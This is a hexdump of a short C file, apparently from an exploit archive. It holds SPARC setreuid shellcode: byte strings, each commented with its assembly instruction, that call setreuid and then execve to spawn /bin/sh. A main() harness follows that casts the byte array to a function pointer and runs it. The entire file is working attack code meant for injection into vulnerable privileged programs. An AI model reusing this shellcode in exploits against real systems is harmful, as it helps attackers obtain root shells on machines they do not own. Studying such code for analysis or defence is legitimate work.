00000000  2f 2a 0d 0a 20 2a 20 6c  68 61 6c 6c 40 74 65 6c  |/*.. * lhall@tel|
00000010  65 67 65 6e 65 74 69 63  2e 6e 65 74 0d 0a 20 2a  |egenetic.net.. *|
00000020  20 73 65 74 72 65 75 69  64 20 73 68 65 6c 6c 63  | setreuid shellc|
00000030  6f 64 65 0d 0a 20 2a 20  66 75 6c 6c 20 64 65 73  |ode.. * full des|
00000040  63 72 69 70 74 69 6f 6e  20 6f 66 20 68 6f 77 20  |cription of how |
00000050  69 74 20 77 61 73 20 64  6f 6e 65 20 61 6e 64 20  |it was done and |
00000060  64 65 66 69 6e 65 73 20  61 74 0d 0a 20 2a 20 68  |defines at.. * h|
00000070  74 74 70 3a 2f 2f 77 77  77 2e 74 65 6c 65 67 65  |ttp://www.telege|
00000080  6e 65 74 69 63 2e 6e 65  74 2f 73 70 61 72 63 2d  |netic.net/sparc-|
00000090  73 68 65 6c 6c 63 6f 64  65 2e 68 74 6d 0d 0a 20  |shellcode.htm.. |
000000a0  2a 2f 0d 0a 0d 0a 63 68  61 72 20 73 68 65 6c 6c  |*/....char shell|
000000b0  63 6f 64 65 5b 5d 20 3d  0d 0a 22 5c 78 39 30 5c  |code[] =.."\x90\|
000000c0  78 31 41 5c 78 34 30 5c  78 30 39 22 20 20 2f 2a  |x1A\x40\x09"  /*|
000000d0  20 78 6f 72 20 25 6f 31  2c 20 25 6f 31 2c 20 25  | xor %o1, %o1, %|
000000e0  6f 30 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |o0          */..|
000000f0  22 5c 78 39 32 5c 78 31  41 5c 78 34 30 5c 78 30  |"\x92\x1A\x40\x0|
00000100  39 22 20 20 2f 2a 20 78  6f 72 20 25 6f 31 2c 20  |9"  /* xor %o1, |
00000110  25 6f 31 2c 20 25 6f 31  20 20 20 20 20 20 20 20  |%o1, %o1        |
00000120  20 20 2a 2f 0d 0a 22 5c  78 38 32 5c 78 31 30 5c  |  */.."\x82\x10\|
00000130  78 32 30 5c 78 43 41 22  20 20 2f 2a 20 6d 6f 76  |x20\xCA"  /* mov|
00000140  20 53 59 53 5f 53 45 54  52 45 55 49 44 28 32 30  | SYS_SETREUID(20|
00000150  32 29 2c 20 25 67 31 20  2a 2f 0d 0a 22 5c 78 39  |2), %g1 */.."\x9|
00000160  31 5c 78 44 30 5c 78 32  30 5c 78 30 38 22 20 20  |1\xD0\x20\x08"  |
00000170  2f 2a 20 74 61 20 4b 45  52 4e 45 4c 28 30 78 30  |/* ta KERNEL(0x0|
00000180  38 29 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |8)            */|
00000190  0d 0a 22 5c 78 32 31 5c  78 30 42 5c 78 44 38 5c  |.."\x21\x0B\xD8\|
000001a0  78 39 41 22 20 20 2f 2a  20 73 65 74 68 69 20 25  |x9A"  /* sethi %|
000001b0  68 69 28 30 78 32 66 36  32 36 39 30 30 29 2c 20  |hi(0x2f626900), |
000001c0  25 6c 30 20 2a 2f 0d 0a  22 5c 78 41 30 5c 78 31  |%l0 */.."\xA0\x1|
000001d0  34 5c 78 32 31 5c 78 36  45 22 20 20 2f 2a 20 6f  |4\x21\x6E"  /* o|
000001e0  72 20 25 6c 30 2c 20 25  6c 6f 28 30 78 31 36 65  |r %l0, %lo(0x16e|
000001f0  29 2c 20 25 6c 30 20 20  20 20 2a 2f 0d 0a 22 5c  |), %l0    */.."\|
00000200  78 32 33 5c 78 30 42 5c  78 44 43 5c 78 44 41 22  |x23\x0B\xDC\xDA"|
00000210  20 20 2f 2a 20 73 65 74  68 69 20 25 68 69 28 30  |  /* sethi %hi(0|
00000220  78 32 66 37 33 36 38 30  30 29 2c 20 25 6c 31 20  |x2f736800), %l1 |
00000230  2a 2f 0d 0a 22 5c 78 45  30 5c 78 33 42 5c 78 42  |*/.."\xE0\x3B\xB|
00000240  46 5c 78 46 30 22 20 20  2f 2a 20 73 74 64 20 25  |F\xF0"  /* std %|
00000250  6c 30 2c 20 5b 25 73 70  20 2d 20 30 78 31 30 5d  |l0, [%sp - 0x10]|
00000260  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 39 30 5c  |      */.."\x90\|
00000270  78 32 33 5c 78 41 30 5c  78 31 30 22 20 20 2f 2a  |x23\xA0\x10"  /*|
00000280  20 73 75 62 20 25 73 70  2c 20 30 78 31 30 2c 20  | sub %sp, 0x10, |
00000290  25 6f 30 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |%o0         */..|
000002a0  22 5c 78 44 30 5c 78 32  33 5c 78 42 46 5c 78 46  |"\xD0\x23\xBF\xF|
000002b0  38 22 20 20 2f 2a 20 73  74 20 20 25 6f 30 2c 20  |8"  /* st  %o0, |
000002c0  5b 25 73 70 20 2d 20 30  78 38 5d 20 20 20 20 20  |[%sp - 0x8]     |
000002d0  20 20 2a 2f 0d 0a 22 5c  78 39 32 5c 78 32 33 5c  |  */.."\x92\x23\|
000002e0  78 41 30 5c 78 30 38 22  20 20 2f 2a 20 73 75 62  |xA0\x08"  /* sub|
000002f0  20 25 73 70 2c 20 30 78  38 2c 20 25 6f 31 20 20  | %sp, 0x8, %o1  |
00000300  20 20 20 20 20 20 20 20  2a 2f 0d 0a 22 5c 78 39  |        */.."\x9|
00000310  34 5c 78 31 41 5c 78 38  30 5c 78 30 41 22 20 20  |4\x1A\x80\x0A"  |
00000320  2f 2a 20 78 6f 72 20 25  6f 32 2c 20 25 6f 32 2c  |/* xor %o2, %o2,|
00000330  20 25 6f 32 20 20 20 20  20 20 20 20 20 20 2a 2f  | %o2          */|
00000340  0d 0a 22 5c 78 38 32 5c  78 31 30 5c 78 32 30 5c  |.."\x82\x10\x20\|
00000350  78 33 42 22 20 20 2f 2a  20 6d 6f 76 20 53 59 53  |x3B"  /* mov SYS|
00000360  5f 45 58 45 43 56 45 28  35 39 29 2c 20 25 67 31  |_EXECVE(59), %g1|
00000370  20 20 20 20 2a 2f 0d 0a  22 5c 78 39 31 5c 78 44  |    */.."\x91\xD|
00000380  30 5c 78 32 30 5c 78 30  38 22 3b 20 2f 2a 20 74  |0\x20\x08"; /* t|
00000390  61 20 4b 45 52 4e 45 4c  28 30 78 30 38 29 20 20  |a KERNEL(0x08)  |
000003a0  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 0d 0a  |          */....|
000003b0  69 6e 74 0d 0a 6d 61 69  6e 20 28 69 6e 74 20 61  |int..main (int a|
000003c0  72 67 63 2c 20 63 68 61  72 20 2a 2a 61 72 67 76  |rgc, char **argv|
000003d0  29 0d 0a 7b 0d 0a 20 20  20 20 20 20 20 69 6e 74  |)..{..       int|
000003e0  20 28 2a 72 65 74 29 28  29 3b 0d 0a 20 20 20 20  | (*ret)();..    |
000003f0  20 20 20 72 65 74 20 3d  20 28 69 6e 74 28 2a 29  |   ret = (int(*)|
00000400  28 29 29 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 20  |())shellcode;.. |
00000410  20 20 20 20 20 20 28 69  6e 74 29 28 2a 72 65 74  |      (int)(*ret|
00000420  29 28 29 3b 0d 0a 20 20  20 20 20 20 20 65 78 69  |)();..       exi|
00000430  74 28 30 29 3b 0d 0a 7d                           |t(0);..}|
00000438
